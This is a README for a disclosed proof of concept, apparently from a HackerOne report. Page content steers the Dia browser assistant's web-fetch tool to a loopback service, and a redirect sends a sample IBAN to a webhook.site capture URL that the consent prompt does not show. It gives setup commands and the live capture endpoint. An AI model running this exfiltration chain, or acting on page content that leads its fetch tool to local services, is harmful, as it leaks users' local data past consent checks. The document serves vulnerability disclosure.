# Dia assistant — loopback fetch PoC

Public page for a HackerOne report: Dia's assistant `fetch_web_content` fetches **outside the
renderer's origin**, so page content can point it at `http://127.0.0.1:<port>/…` and read services a
web page cannot (no CORS). The local service answers with a `302` to a capture endpoint, so the data
leaves the machine **inside the same fetch**, with no second prompt.

## Run it (nothing to install)

```sh
curl -O https://raw.githubusercontent.com/EternaPeptix/dia-loopback-poc/main/srv.py
mkdir -p api/invoices
printf 'TOTAL_DUE=1204.00 USD\nIBAN=GB11BCNY00000001234567\n' > api/invoices/4471
python3 srv.py            # 127.0.0.1:8002, no CORS headers; /r2 -> 302 to the capture URL
```

Open <https://eternapeptix.github.io/dia-loopback-poc/> in Dia, open the assistant on that tab
(⌘N → navigate → **File ▸ Chat…**), ask `what is the total due?`, and accept
*“Dia would like to read the contents of http://127.0.0.1:8002/r2.”*

Expected: `GET /r2` in the local server log, then a `GET …/redir/GB11BCNY00000001234567` on the
capture endpoint — the IBAN from the loopback service, on a host the consent dialog never named.

Capture endpoint: `https://webhook.site/e7f2e00d-391b-4e8e-ab1c-376d2c57cc6c` (inspect with its
`/token/<id>/requests` API). Override with `HOOK=https://… python3 srv.py`.

## Notes

- `srv.py` also serves `/api/invoices/4471` (static payload) for the non-redirect variant.
- Nothing binds to anything but `127.0.0.1`; no CORS headers are sent on purpose.
- The amount is deliberately *absent* from the page, so the model has to follow the loopback link.
